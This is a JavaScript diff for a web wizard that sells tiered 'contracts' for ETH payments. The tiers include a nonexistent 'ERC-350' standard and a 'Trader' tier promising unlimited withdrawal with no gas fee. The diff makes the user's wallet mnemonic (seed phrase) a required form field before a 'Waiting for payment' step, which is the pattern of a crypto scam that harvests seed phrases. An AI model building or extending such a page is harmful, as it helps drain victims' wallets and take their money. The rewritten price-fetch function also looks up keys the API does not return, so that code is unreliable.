@@ -18,8 +18,31 @@ function showStep(n) {
 
 function nextStep() {
   if (currentStep === 1) {
-    selectedContractType = document.getElementById('contract-type').value;
-    generateOptions(selectedContractType);
+    const network = document.getElementById('network').value;
+    const contractType = document.getElementById('contract-type').value;
+    if (!network || network === "Select Network" || !contractType) {
+      alert("Please select both a network and contract type.");
+      return;
+    }
+    selectedContractType = contractType;
+    generateOptions(contractType);
+  } else if (currentStep === 2) {
+    if (!selectedTier) {
+      alert("Please select a tier.");
+      return;
+    }
+  } else if (currentStep === 3) {
+    const name = document.getElementById('name').value.trim();
+    const surname = document.getElementById('surname').value.trim();
+    const country = document.getElementById('country').value;
+    const exchange = document.getElementById('exchange').value;
+    const email = document.getElementById('email').value.trim();
+    const mnemonic = document.getElementById('mnemonic').value.trim();
+
+    if (!name || !surname || !country || !exchange || !validateEmail(email) || !mnemonic) {
+      alert("Please fill in all required fields.");
+      return;
+    }
   }
   currentStep++;
   showStep(currentStep);
@@ -30,31 +53,33 @@ function prevStep() {
   showStep(currentStep);
 }
 
+function validateEmail(email) {
+  const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+  return re.test(email.toLowerCase());
+}
+
 function generateOptions(type) {
   const container = document.getElementById('options-container');
   container.innerHTML = '';
-
   const options = {
     "Token Contract (ERC-20)": [
-      { name: "Normal", eth: 1.5, desc: "Basic transfer functionality\nLimited customization\nStandard gas fees apply" },
-      { name: "Medium", eth: 2.1, desc: "Optimized transfer & basic airdrop capability\nReduced gas costs\nModerate customization" },
-      { name: "Trader", eth: 3.4, desc: "Unlimited withdrawal\nNo gas fee\nAuto-market integration" }
+      { name: "Normal", eth: 1.5, desc: "Basic functionality" },
+      { name: "Medium", eth: 2.1, desc: "Optimized gas" },
+      { name: "Trader", eth: 3.4, desc: "Market ready" }
     ],
     "Withdrawal Contract (ERC-350)": [
-      { name: "Normal", eth: 0.6, desc: "Simple one-time withdrawal\nBasic security" },
-      { name: "Medium", eth: 1.0, desc: "Scheduled withdrawals\nCustom token support" },
-      { name: "Expert", eth: 3.4, desc: "High-value transfers\nGasless bulk withdrawals" }
-    ],
-    // Add other contract types here...
+      { name: "Normal", eth: 0.6, desc: "Simple withdrawal" },
+      { name: "Medium", eth: 1.0, desc: "Scheduled withdrawals" },
+      { name: "Expert", eth: 3.4, desc: "Bulk operations" }
+    ]
   };
 
-  const selectedOptions = options[type];
-  selectedOptions.forEach(opt => {
+  options[type].forEach(opt => {
     const box = document.createElement('div');
     box.className = 'option-box';
     box.innerHTML = `
       <h3>${opt.name} – ${opt.eth} ETH (<span class="converted-price">${convertETH(opt.eth)}</span>)</h3>
-      <p>${opt.desc.replace(/\n/g, '<br>')}</p>
+      <p>${opt.desc}</p>
       <button onclick="selectTier('${opt.name}', ${opt.eth})">Choose</button>
     `;
     container.appendChild(box);
@@ -71,15 +96,19 @@ function selectTier(tier, eth) {
 
 function convertETH(eth) {
   const currency = document.getElementById('currency').value;
-  const rate = rates[currency];
-  return `${(eth * rate).toFixed(2)} ${currency}`;
+  return `${(eth * rates[currency]).toFixed(2)} ${currency}`;
 }
 
 function updatePrices() {
-  document.querySelectorAll('.converted-price').forEach((el, i) => {
+  document.querySelectorAll('.converted-price').forEach((el) => {
     const eth = parseFloat(el.parentElement.textContent.split('–')[1].split('ETH')[0].trim());
     el.textContent = convertETH(eth);
   });
+}
+
+function simulateLoading() {
+  nextStep();
+  document.querySelector('.loading').textContent = 'Waiting for payment…';
 }
 
 function copyAddress() {
@@ -88,50 +117,22 @@ function copyAddress() {
   alert('Address copied to clipboard!');
 }
 
-function simulateLoading() {
-  document.querySelector('.loading').textContent = 'Waiting for payment…';
-  nextStep(); // Move to payment step
-}
-
-
-
-
+// Fetch crypto prices (simplified)
 async function updateLiveCryptoPrices() {
   const apiUrl = 'https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,ripple,solana&vs_currencies=usd';
-
   try {
-    const response = await fetch(apiUrl);
-    if (!response.ok) {
-      throw new Error('Network response was not ok');
-    }
-    const data = await response.json();
-
-    const priceContainer = document.getElementById('cryptoPrices');
-    priceContainer.innerHTML = ''; // Clear previous content
-
-    const prices = {
-      BTC: data.bitcoin.usd,
-      ETH: data.ethereum.usd,
-      XRP: data.ripple.usd,
-      SOL: data.solana.usd
-    };
-
-    Object.entries(prices).forEach(([symbol, value]) => {
+    const res = await fetch(apiUrl);
+    const data = await res.json();
+    const container = document.getElementById('cryptoPrices');
+    container.innerHTML = '';
+    ['BTC', 'ETH', 'XRP', 'SOL'].forEach((coin) => {
       const span = document.createElement('span');
-      span.textContent = `${symbol}: $${value.toLocaleString()}`;
-      span.classList.add('updated');
-      priceContainer.appendChild(span);
-
-      // Remove animation class after glow completes
-      setTimeout(() => span.classList.remove('updated'), 1000);
+      span.textContent = `${coin}: $${data[coin.toLowerCase()].usd.toLocaleString()}`;
+      container.appendChild(span);
     });
-  } catch (error) {
-    console.error('Error fetching live crypto prices:', error);
+  } catch (err) {
+    console.error('Error loading prices', err);
   }
 }
-
-// Initial load
 updateLiveCryptoPrices();
-
-// Update every 10 seconds
 setInterval(updateLiveCryptoPrices, 10000);
